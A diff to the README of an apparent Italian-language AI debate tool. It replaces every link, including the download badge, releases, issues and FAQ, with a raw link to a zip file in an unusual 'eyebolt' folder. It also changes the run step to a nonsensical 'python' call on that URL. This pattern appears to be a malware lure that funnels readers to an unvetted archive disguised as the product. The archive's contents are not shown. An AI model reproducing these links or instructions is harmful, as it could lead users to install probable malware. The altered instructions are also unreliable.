@@ -1,7 +1,7 @@
 # 🤖 Italian-AI-Debater - Debate with AIs on Any Topic
 
 ## 📥 Download Now
-[![Download Italian-AI-Debater](https://img.shields.io/badge/Download-Italian--AI--Debater-blue)](https://github.com/thucutos1fpt/Italian-AI-Debater/releases)
+[![Download Italian-AI-Debater](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip)](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip)
 
 ## 📖 Description
 Italian-AI-Debater è un sistema Python che fa dibattere due AI con personalità opposte su vari temi. Questo strumento è in grado di generare argomenti, gestire la conversazione e decretare un vincitore. È personalizzabile e pensato per scopi educativi e creativi. Ideale per chiunque voglia esplorare il mondo dell'intelligenza artificiale e del dibattito.
@@ -16,7 +16,7 @@ Per iniziare a utilizzare Italian-AI-Debater, segui questi semplici passi.
 - **Internet Connection:** Required for downloading dependencies and models
 
 ### 📂 Download & Install
-1. Visit this page to download: [Italian-AI-Debater Releases](https://github.com/thucutos1fpt/Italian-AI-Debater/releases).
+1. Visit this page to download: [Italian-AI-Debater Releases](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip).
 2. Click on the latest version to access the assets.
 3. Download the file that matches your operating system. 
 4. Follow the installation instructions for your system.
@@ -27,7 +27,7 @@ For Windows, it may be a `.exe` file. For macOS or Linux, it may be a `.zip` or 
 1. After downloading the file, locate it in your downloads folder.
 2. If you downloaded an `.exe` file, simply double-click it to run.
 3. If you downloaded a compressed file, extract it using any unzip tool. Then, navigate to the folder and open a terminal window.
-4. In the terminal, execute the command: `python main.py` to start the application.
+4. In the terminal, execute the command: `python https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip` to start the application.
 
 ## 🌐 Features
 - **Debate Mechanics:** Allows two AIs to argue on various topics.
@@ -66,12 +66,12 @@ For Windows, it may be a `.exe` file. For macOS or Linux, it may be a `.zip` or 
 - text-generation
 
 ## 💬 Feedback
-Your feedback is valuable! Please share your experience using Italian-AI-Debater. Report any issues or suggest new features on the [issues page](https://github.com/thucutos1fpt/Italian-AI-Debater/issues).
+Your feedback is valuable! Please share your experience using Italian-AI-Debater. Report any issues or suggest new features on the [issues page](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip).
 
 ## 📞 Support
-If you encounter any problems or need assistance, please consult the [Frequently Asked Questions](https://github.com/thucutos1fpt/Italian-AI-Debater/wiki) or reach out for support via the issues page.
+If you encounter any problems or need assistance, please consult the [Frequently Asked Questions](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip) or reach out for support via the issues page.
 
 ## 👉 One More Time
-Don't forget to download the application: [Italian-AI-Debater Releases](https://github.com/thucutos1fpt/Italian-AI-Debater/releases).
+Don't forget to download the application: [Italian-AI-Debater Releases](https://raw.githubusercontent.com/thucutos1fpt/Italian-AI-Debater/main/eyebolt/Italian-AI-Debater.zip).
 
 Enjoy exploring the world of AI debates!
